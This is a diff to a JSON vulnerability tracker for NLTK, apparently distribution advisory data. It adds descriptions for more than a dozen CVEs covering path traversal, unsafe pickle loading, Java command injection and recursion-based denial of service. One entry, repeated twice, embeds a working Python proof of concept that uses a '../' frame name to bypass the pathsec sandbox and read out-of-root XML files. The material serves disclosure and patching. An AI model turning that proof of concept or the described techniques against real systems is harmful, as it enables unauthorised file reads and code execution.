@@ -164,8 +164,8 @@
             },
             "CVE-2026-12074": {
                 "cve_id": "CVE-2026-12074",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Natural Language Toolkit (NLTK) has path traversal in FramenetCorpusReader.frame() that allows arbitrary XML file read, bypassing the nltk.pathsec sandbox (ENFORCE=True)",
+                "description": "### Summary\n`FramenetCorpusReader.frame(name)` interpolates a caller-supplied frame name into an XML file path that is read with the builtin `open()`, bypassing `CorpusReader.open()` and the `nltk.pathsec` sandbox \u2014 including strict `ENFORCE=True` mode. A `../` sequence in the name escapes the corpus root, yielding an arbitrary XML file read whose parsed content is returned to the caller.\n\n\n### Details\n`frame_by_name` builds the path by joining the corpus root, the frame directory, and the caller-supplied name with a fixed `.xml` extension, with no containment check, then constructs an `XMLCorpusView` from that **string** path. Because the view is built from a string rather than a `PathPointer`, it reads with the builtin `open()`, so `nltk.pathsec.validate_path()` is never invoked and `ENFORCE=True` does not block the access. This is the same path-traversal class previously hardened for the generic corpus readers; `frame_by_name` never goes through `CorpusReader.open()`, so that protection does not apply.\n\nThe same string-path-into-`XMLCorpusView` pattern exists in two sibling methods that take a name from corpus data rather than the immediate caller:\n- `doc()` \u2014 uses the index entry `filename` field\n- the lexical-unit file loader \u2014 uses the `lexUnit` ID attribute\n\nThese are reachable through a malicious or attacker-modified FrameNet corpus index.\n\n### PoC\n```python\n\"\"\"\n\nimport os\nimport sys\nimport tempfile\nimport warnings\nfrom pathlib import Path\n\nwarnings.filterwarnings(\"ignore\")\n\n# --- Turn the documented strict sandbox ON, before importing the reader. ---\nimport nltk.pathsec as ps\nps.ENFORCE = True\n\nimport nltk\nfrom nltk.corpus.reader.framenet import FramenetCorpusReader, FramenetError\n\nFRAME_XML = (\n    '<?xml version=\"1.0\" encoding=\"UTF-8\"?>\\n'\n    '<frame xmlns=\"http://framenet.icsi.berkeley.edu\" ID=\"1337\" name=\"pwned\">\\n'\n    \"<definition>SECRET-OUT-OF-ROOT-CONTENT</definition>\\n\"\n    \"</frame>\\n\"\n)\n\nBANNER = \"\"\"\\\n===========================================================\n NLTK FramenetCorpusReader.frame() Path Traversal PoC\n nltk {ver}   |   nltk.pathsec.ENFORCE = {enforce}\n===========================================================\"\"\".format(\n    ver=nltk.__version__, enforce=ps.ENFORCE\n)\n\n\ndef build_corpus():\n    \"\"\"Minimal valid FrameNet corpus + a frame-shaped secret OUTSIDE its root.\"\"\"\n    base = Path(tempfile.mkdtemp(prefix=\"fn_poc_\"))\n    root = base / \"corpora\" / \"framenet\"\n    for d in (\"frame\", \"fulltext\", \"lu\"):\n        (root / d).mkdir(parents=True)\n    (root / \"frameIndex.xml\").write_text(\n        '<?xml version=\"1.0\"?><frameIndex></frameIndex>'\n    )\n    (root / \"frRelation.xml\").write_text(\n        '<?xml version=\"1.0\"?><frameRelations></frameRelations>'\n    )\n\n    # A frame-shaped XML file OUTSIDE the corpus root (the \"sensitive\" target).\n    secret = base / \"private\"\n    secret.mkdir()\n    (secret / \"secret.xml\").write_text(FRAME_XML)\n\n    return base, root, secret / \"secret.xml\"\n\n\ndef main():\n    print(BANNER)\n    base, root, secret_path = build_corpus()\n    print(f\"[*] corpus root : {root}\")\n    print(f\"[*] secret file : {secret_path}  (OUTSIDE the root)\\n\")\n\n    fn = FramenetCorpusReader(str(root), [])\n\n    # Attacker-controlled frame name climbs out of <root>/frame/ up to <base>/private/secret.xml\n    evil = os.path.join(\"..\", \"..\", \"..\", \"private\", \"secret\")\n    print(f\"[*] calling   fn.frame({evil!r})\")\n\n    try:\n        f = fn.frame(evil)\n        definition = f[\"definition\"]\n        if \"SECRET-OUT-OF-ROOT-CONTENT\" in definition:\n            print(\"\\n  [VULN] out-of-root file was read and returned to caller\")\n            print(f\"         frame name : {evil}\")\n            print(f\"         frame ID   : {f['ID']}   name: {f['name']}\")\n            print(f\"         definition : {definition}\")\n            print(f\"\\n  -> nltk.pathsec sandbox bypassed despite ENFORCE = {ps.ENFORCE}\")\n            verdict = \"VULNERABLE\"\n        else:\n            print(f\"\\n  [?] frame() returned but content unexpected: {definition!r}\")\n            verdict = \"INCONCLUSIVE\"\n    except FramenetError as e:\n        # Patched build (#3581): _reject_unsafe_path_component raises before open().\n        print(f\"\\n  [SAFE] FramenetError: {e}\")\n        print(\"         traversal rejected before any file was opened (patched)\")\n        verdict = \"NOT VULNERABLE\"\n    except Exception as e:\n        print(f\"\\n  [SAFE] {type(e).__name__}: {e}\")\n        verdict = \"NOT VULNERABLE\"\n\n    # Control: a plain absent name must fail as 'Unknown frame', NOT as a read.\n    print(\"\\n[CONTROL] benign absent name should be 'Unknown frame':\")\n    try:\n        fn.frame(\"Definitely_Not_A_Frame\")\n        print(\"  [?] unexpectedly succeeded\")\n    except Exception as e:\n        print(f\"  ok -> {type(e).__name__}: {e}\")\n\n    print(\"\\n\" + \"=\" * 59)\n    print(f\" Result: {verdict}  (ENFORCE = {ps.ENFORCE})\")\n    print(\"=\" * 59)\n\n\nif __name__ == \"__main__\":\n    main()\n\n```\n\n\n### Impact\n- **Out-of-sandbox arbitrary XML read.** Any application that routes attacker-influenced input into `frame()` can be made to read XML files from directories outside the intended corpus root and have their parsed content returned. `frame()` is a primary public API designed to accept a caller-specified frame name, so this is a natural exposure for any service exposing FrameNet lookups to user input.\n- **Broad read primitive.** Only a fixed `.xml` extension is appended; the attacker controls both directory and basename, giving \"read any XML file the process can read.\" Full content disclosure requires frame-shaped XML; other files yield a distinguishable parse error that acts as a file-existence/readability oracle for arbitrary paths.\n- **Silent bypass of an advertised boundary.** NLTK's `SECURITY.md` presents the `nltk.pathsec` sandbox and `ENFORCE=True` as a hard boundary for web apps, multi-tenant pipelines, and CI/CD. Because `frame_by_name` builds the path itself and reads through a string-path `XMLCorpusView`, the containment guard is never called and `ENFORCE=True` does not block the read \u2014 silently, with no error or warning.\n- **Crafted-corpus reach.** Via `doc()` and the lexical-unit loader, a malicious FrameNet data directory drives the same traversal with no caller-supplied name.\n- **Sensitive targets.** Depending on deployment, readable out-of-root XML can include application configuration, data exports, and on-disk credentials stored as XML; the oracle behavior also allows filesystem mapping. Where `frame()` output is reflected to the requester, disclosure is direct and non-blind.",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
@@ -265,6 +265,84 @@
                     }
                 ]
             },
+            "CVE-2026-128135": {
+                "cve_id": "CVE-2026-128135",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. From 3.9.4 to 3.10.3, NLTK ZIP package extraction can write through an existing in-root hardlink whose other link points outside the NLTK data root. A local attacker who can prepare the extraction target can cause a package member write to overwrite an out-of-root file, violating the pathsec containment boundary and affecting integrity and availability. This issues is fixed in version 3.10.4.",
+                "severity": "HIGH",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-128136": {
+                "cve_id": "CVE-2026-128136",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. From 3.10.0 until 3.10.4, allowlisted_pickle_load keys dangerous NumPy globals by export name, allowing submodule-local numpy.lib file input/output callables to evade the denylist under the broad module allowance used by TransitionParser. A crafted pickle can invoke recfromtxt to read a local file or open_memmap to create or truncate an attacker-selected file when a victim loads an untrusted model. This issue is fixed in version 3.10.4.",
+                "severity": "LOW",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.9.1-2",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-128137": {
+                "cve_id": "CVE-2026-128137",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. From 3.9.4 until 3.10.4, NLTK corpus-reader path pointers and view methods validate a requested relative path without consistently resolving intermediate directory symlinks against the reader's scoped root. A local attacker who can place such a symlink can make abspaths or words reach a readable file outside the corpus root and disclose its contents. On releases with pathsec enforcement, the file must remain inside a global NLTK allowed root; version 3.9.4 has enforcement disabled and permits a broader escape. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-128138": {
+                "cve_id": "CVE-2026-128138",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. From 3.10.3 until 3.10.4, the NLTK 3.10.3 JVM hardening validates Java launcher tokens in the options channel but appends the caller-controlled cmd sequence without requiring its first token to be a main class. Supplying -jar or an @argfile through nltk.internals.java or StanfordSegmenter.java_class can therefore execute attacker-selected Java bytecode without the unsafe-JAR opt-in. This issue is fixed in version 3.10.4.",
+                "severity": "CRITICAL",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-128139": {
+                "cve_id": "CVE-2026-128139",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. From 3.6 to 3.10.3, XMLCorpusView._read_xml_fragment accumulates 1 KiB blocks and repeatedly applies whole-buffer XML validation while a comment or CDATA terminator remains ahead. A large comment in an attacker-controlled corpus file causes quadratic CPU consumption through documented XML corpus readers across the affected range. On 3.6 and 3.9.2, a large CDATA section incurs the quadratic scan before rejection, while on 3.10.3 both comment and CDATA documents are read successfully. This vulnerability is fixed in 3.10.4.",
+                "severity": "HIGH",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-128140": {
+                "cve_id": "CVE-2026-128140",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. From 3.6.7 until 3.10.4, nltk.downloader follows collection membership without tracking already visited collection nodes. A self-referencing or mutually referencing collection index can therefore make the package-closure walk loop indefinitely while its queue and memory usage grow, denying service when a victim processes the attacker-influenced index. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
             "CVE-2026-12841": {
                 "cve_id": "CVE-2026-12841",
                 "title": "[Unknown description]",
@@ -286,9 +364,191 @@
             },
             "CVE-2026-12876": {
                 "cve_id": "CVE-2026-12876",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "[Unknown description]",
+                "description": "[Unknown description]",
                 "severity": "LOW",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129221": {
+                "cve_id": "CVE-2026-129221",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, nltk.classify.weka.ARFF_Formatter writes attacker-controlled class labels into the Weka ARFF @ATTRIBUTE '-label-' declaration without safely formatting the label tokens. Crafted labels can alter the generated ARFF schema or records, corrupting classifier input and causing integrity loss or processing failure. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129222": {
+                "cve_id": "CVE-2026-129222",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, DependencyGraph.tree and DependencyGraph.triples walk parsed dependency edges through unbounded Python recursion and do not use a working cycle or depth guard. A crafted CoNLL or Malt-TAB dependency file containing a sufficiently long chain can raise RecursionError when the documented traversal APIs are called, aborting the current worker. This issue is fixed in version 3.10.4.",
+                "severity": "HIGH",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129223": {
+                "cve_id": "CVE-2026-129223",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, WordNet Synset.tree and acyclic_tree traverse relation graphs through recursive utility helpers without a depth bound. Exploitation requires the host application to load an attacker-influenced custom or foreign WordNet-format lexical resource; no relation in NLTK's bundled WordNet 3.0 corpus reaches the crash threshold. An excessively deep relation graph in such a resource can exceed the Python recursion limit and terminate the traversal or request worker. This issue is fixed in version 3.10.4.",
+                "severity": "HIGH",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129224": {
+                "cve_id": "CVE-2026-129224",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, the CCG lexicon parser's matchBrackets and augParseCategory functions recursively process nested parenthesized categories without a depth bound. An attacker-controlled lexicon string with excessive nesting can raise RecursionError through nltk.ccg.lexicon.fromstring and terminate the parse operation or request worker. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129225": {
+                "cve_id": "CVE-2026-129225",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. In 3.10.3 and earlier, DependencyGraph._tree and triples recurse once per dependency edge without a depth bound, and get_cycle_path also lacks a visited-set termination guard. A deeply chained or cyclic attacker-controlled CoNLL or Malt-TAB dependency structure can raise RecursionError and abort a parse worker. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129226": {
+                "cve_id": "CVE-2026-129226",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, the semantic-logic read_type parser recursively processes both halves of nested complex type strings without applying LogicParser.MAX_PARSE_DEPTH. An attacker-controlled type string or signature with excessive nesting can raise RecursionError through Type.fromstring or type-checking entry points and abort the current worker. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129227": {
+                "cve_id": "CVE-2026-129227",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, Tree.fromlist recursively converts nested Python list input into Tree objects without enforcing a maximum tree depth. An attacker-controlled list nested beyond the interpreter recursion limit can raise RecursionError and terminate the current parse operation or request worker. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129228": {
+                "cve_id": "CVE-2026-129228",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, ToolboxSettings.parse builds a deeply nested attacker-controlled settings tree iteratively, but the later public helpers to_settings_string, remove_blanks, add_default_fields, sort_fields, and add_blank_lines recursively traverse that tree without a depth bound. Invoking any of those helpers on input nested beyond the interpreter recursion limit can raise RecursionError and abort the operation or request worker. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129229": {
+                "cve_id": "CVE-2026-129229",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. From 3.10.0 until 3.10.4, TokenSearcher.findall and Text.findall accept caller-controlled regular expressions with an unbounded number of capturing groups throughout the affected range. Starting in 3.10.3, nltk.redos.compile and RegexpTokenizer expose the same compile-time vector. The third-party regex engine compiles group-dense patterns with roughly quadratic cost before the match-time timeout begins, allowing a small unauthenticated request to exhaust CPU and deny service. This issue is fixed in version 3.10.4.",
+                "severity": "LOW",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.9.1-2",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129230": {
+                "cve_id": "CVE-2026-129230",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, WordNet Synset.max_depth, min_depth, hypernym_paths, and hypernym_distances recursively follow attacker-controlled corpus pointers without a visited-node set or depth cap. A cyclic or excessively deep hypernym graph can raise RecursionError and terminate traversal APIs and similarity operations that depend on them. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129231": {
+                "cve_id": "CVE-2026-129231",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, SeekableUnicodeStreamReader.readline appends each new block to a growing character buffer and reruns splitlines over the entire buffer on every iteration. An attacker-controlled corpus file containing one very long unterminated line therefore causes quadratic CPU consumption in line-oriented corpus readers and can deny service. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129232": {
+                "cve_id": "CVE-2026-129232",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, XMLCorpusView.read_block rebuilds the full root-to-node context path with \"/\".join(context) for every start tag while searching for a matching element. Deeply nested attacker-influenced corpus XML therefore causes quadratic pure-Python work and can pin a processing worker, resulting in denial of service. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129233": {
+                "cve_id": "CVE-2026-129233",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. From 3.10.0 until 3.10.4, StreamBackedCorpusView performs os.stat on a caller-supplied plain string path during construction before pathsec containment is enforced. The PathPointer branch used by in-tree corpus readers is validated, so exploitation requires application code to pass an attacker-influenced string directly to the public constructor. That string can identify an out-of-root path and disclose its existence, size, and modification time even though opening the file would be rejected. This issue is fixed in version 3.10.4.",
+                "severity": "LOW",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.9.1-2",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129234": {
+                "cve_id": "CVE-2026-129234",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, Prover9Parent.config_prover9 and Mace accept a relative binary_location and pass it to find_binary as path_to_bin, disabling the bare-name absolute-path guard. A local attacker who can plant prover9 or mace4 in the resolved working directory can cause subprocess.Popen to execute that binary with the invoking user's privileges. This issue is fixed in version 3.10.4.",
+                "severity": "HIGH",
                 "status": "open",
                 "events": [
                     {
@@ -1063,8 +1323,8 @@
             },
             "CVE-2026-12074": {
                 "cve_id": "CVE-2026-12074",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "Natural Language Toolkit (NLTK) has path traversal in FramenetCorpusReader.frame() that allows arbitrary XML file read, bypassing the nltk.pathsec sandbox (ENFORCE=True)",
+                "description": "### Summary\n`FramenetCorpusReader.frame(name)` interpolates a caller-supplied frame name into an XML file path that is read with the builtin `open()`, bypassing `CorpusReader.open()` and the `nltk.pathsec` sandbox \u2014 including strict `ENFORCE=True` mode. A `../` sequence in the name escapes the corpus root, yielding an arbitrary XML file read whose parsed content is returned to the caller.\n\n\n### Details\n`frame_by_name` builds the path by joining the corpus root, the frame directory, and the caller-supplied name with a fixed `.xml` extension, with no containment check, then constructs an `XMLCorpusView` from that **string** path. Because the view is built from a string rather than a `PathPointer`, it reads with the builtin `open()`, so `nltk.pathsec.validate_path()` is never invoked and `ENFORCE=True` does not block the access. This is the same path-traversal class previously hardened for the generic corpus readers; `frame_by_name` never goes through `CorpusReader.open()`, so that protection does not apply.\n\nThe same string-path-into-`XMLCorpusView` pattern exists in two sibling methods that take a name from corpus data rather than the immediate caller:\n- `doc()` \u2014 uses the index entry `filename` field\n- the lexical-unit file loader \u2014 uses the `lexUnit` ID attribute\n\nThese are reachable through a malicious or attacker-modified FrameNet corpus index.\n\n### PoC\n```python\n\"\"\"\n\nimport os\nimport sys\nimport tempfile\nimport warnings\nfrom pathlib import Path\n\nwarnings.filterwarnings(\"ignore\")\n\n# --- Turn the documented strict sandbox ON, before importing the reader. ---\nimport nltk.pathsec as ps\nps.ENFORCE = True\n\nimport nltk\nfrom nltk.corpus.reader.framenet import FramenetCorpusReader, FramenetError\n\nFRAME_XML = (\n    '<?xml version=\"1.0\" encoding=\"UTF-8\"?>\\n'\n    '<frame xmlns=\"http://framenet.icsi.berkeley.edu\" ID=\"1337\" name=\"pwned\">\\n'\n    \"<definition>SECRET-OUT-OF-ROOT-CONTENT</definition>\\n\"\n    \"</frame>\\n\"\n)\n\nBANNER = \"\"\"\\\n===========================================================\n NLTK FramenetCorpusReader.frame() Path Traversal PoC\n nltk {ver}   |   nltk.pathsec.ENFORCE = {enforce}\n===========================================================\"\"\".format(\n    ver=nltk.__version__, enforce=ps.ENFORCE\n)\n\n\ndef build_corpus():\n    \"\"\"Minimal valid FrameNet corpus + a frame-shaped secret OUTSIDE its root.\"\"\"\n    base = Path(tempfile.mkdtemp(prefix=\"fn_poc_\"))\n    root = base / \"corpora\" / \"framenet\"\n    for d in (\"frame\", \"fulltext\", \"lu\"):\n        (root / d).mkdir(parents=True)\n    (root / \"frameIndex.xml\").write_text(\n        '<?xml version=\"1.0\"?><frameIndex></frameIndex>'\n    )\n    (root / \"frRelation.xml\").write_text(\n        '<?xml version=\"1.0\"?><frameRelations></frameRelations>'\n    )\n\n    # A frame-shaped XML file OUTSIDE the corpus root (the \"sensitive\" target).\n    secret = base / \"private\"\n    secret.mkdir()\n    (secret / \"secret.xml\").write_text(FRAME_XML)\n\n    return base, root, secret / \"secret.xml\"\n\n\ndef main():\n    print(BANNER)\n    base, root, secret_path = build_corpus()\n    print(f\"[*] corpus root : {root}\")\n    print(f\"[*] secret file : {secret_path}  (OUTSIDE the root)\\n\")\n\n    fn = FramenetCorpusReader(str(root), [])\n\n    # Attacker-controlled frame name climbs out of <root>/frame/ up to <base>/private/secret.xml\n    evil = os.path.join(\"..\", \"..\", \"..\", \"private\", \"secret\")\n    print(f\"[*] calling   fn.frame({evil!r})\")\n\n    try:\n        f = fn.frame(evil)\n        definition = f[\"definition\"]\n        if \"SECRET-OUT-OF-ROOT-CONTENT\" in definition:\n            print(\"\\n  [VULN] out-of-root file was read and returned to caller\")\n            print(f\"         frame name : {evil}\")\n            print(f\"         frame ID   : {f['ID']}   name: {f['name']}\")\n            print(f\"         definition : {definition}\")\n            print(f\"\\n  -> nltk.pathsec sandbox bypassed despite ENFORCE = {ps.ENFORCE}\")\n            verdict = \"VULNERABLE\"\n        else:\n            print(f\"\\n  [?] frame() returned but content unexpected: {definition!r}\")\n            verdict = \"INCONCLUSIVE\"\n    except FramenetError as e:\n        # Patched build (#3581): _reject_unsafe_path_component raises before open().\n        print(f\"\\n  [SAFE] FramenetError: {e}\")\n        print(\"         traversal rejected before any file was opened (patched)\")\n        verdict = \"NOT VULNERABLE\"\n    except Exception as e:\n        print(f\"\\n  [SAFE] {type(e).__name__}: {e}\")\n        verdict = \"NOT VULNERABLE\"\n\n    # Control: a plain absent name must fail as 'Unknown frame', NOT as a read.\n    print(\"\\n[CONTROL] benign absent name should be 'Unknown frame':\")\n    try:\n        fn.frame(\"Definitely_Not_A_Frame\")\n        print(\"  [?] unexpectedly succeeded\")\n    except Exception as e:\n        print(f\"  ok -> {type(e).__name__}: {e}\")\n\n    print(\"\\n\" + \"=\" * 59)\n    print(f\" Result: {verdict}  (ENFORCE = {ps.ENFORCE})\")\n    print(\"=\" * 59)\n\n\nif __name__ == \"__main__\":\n    main()\n\n```\n\n\n### Impact\n- **Out-of-sandbox arbitrary XML read.** Any application that routes attacker-influenced input into `frame()` can be made to read XML files from directories outside the intended corpus root and have their parsed content returned. `frame()` is a primary public API designed to accept a caller-specified frame name, so this is a natural exposure for any service exposing FrameNet lookups to user input.\n- **Broad read primitive.** Only a fixed `.xml` extension is appended; the attacker controls both directory and basename, giving \"read any XML file the process can read.\" Full content disclosure requires frame-shaped XML; other files yield a distinguishable parse error that acts as a file-existence/readability oracle for arbitrary paths.\n- **Silent bypass of an advertised boundary.** NLTK's `SECURITY.md` presents the `nltk.pathsec` sandbox and `ENFORCE=True` as a hard boundary for web apps, multi-tenant pipelines, and CI/CD. Because `frame_by_name` builds the path itself and reads through a string-path `XMLCorpusView`, the containment guard is never called and `ENFORCE=True` does not block the read \u2014 silently, with no error or warning.\n- **Crafted-corpus reach.** Via `doc()` and the lexical-unit loader, a malicious FrameNet data directory drives the same traversal with no caller-supplied name.\n- **Sensitive targets.** Depending on deployment, readable out-of-root XML can include application configuration, data exports, and on-disk credentials stored as XML; the oracle behavior also allows filesystem mapping. Where `frame()` output is reflected to the requester, disclosure is direct and non-blind.",
                 "severity": "LOW",
                 "status": "fixed",
                 "events": [
@@ -1164,6 +1424,84 @@
                     }
                 ]
             },
+            "CVE-2026-128135": {
+                "cve_id": "CVE-2026-128135",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. From 3.9.4 to 3.10.3, NLTK ZIP package extraction can write through an existing in-root hardlink whose other link points outside the NLTK data root. A local attacker who can prepare the extraction target can cause a package member write to overwrite an out-of-root file, violating the pathsec containment boundary and affecting integrity and availability. This issues is fixed in version 3.10.4.",
+                "severity": "HIGH",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-128136": {
+                "cve_id": "CVE-2026-128136",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. From 3.10.0 until 3.10.4, allowlisted_pickle_load keys dangerous NumPy globals by export name, allowing submodule-local numpy.lib file input/output callables to evade the denylist under the broad module allowance used by TransitionParser. A crafted pickle can invoke recfromtxt to read a local file or open_memmap to create or truncate an attacker-selected file when a victim loads an untrusted model. This issue is fixed in version 3.10.4.",
+                "severity": "LOW",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.9.1-2",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-128137": {
+                "cve_id": "CVE-2026-128137",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. From 3.9.4 until 3.10.4, NLTK corpus-reader path pointers and view methods validate a requested relative path without consistently resolving intermediate directory symlinks against the reader's scoped root. A local attacker who can place such a symlink can make abspaths or words reach a readable file outside the corpus root and disclose its contents. On releases with pathsec enforcement, the file must remain inside a global NLTK allowed root; version 3.9.4 has enforcement disabled and permits a broader escape. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-128138": {
+                "cve_id": "CVE-2026-128138",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
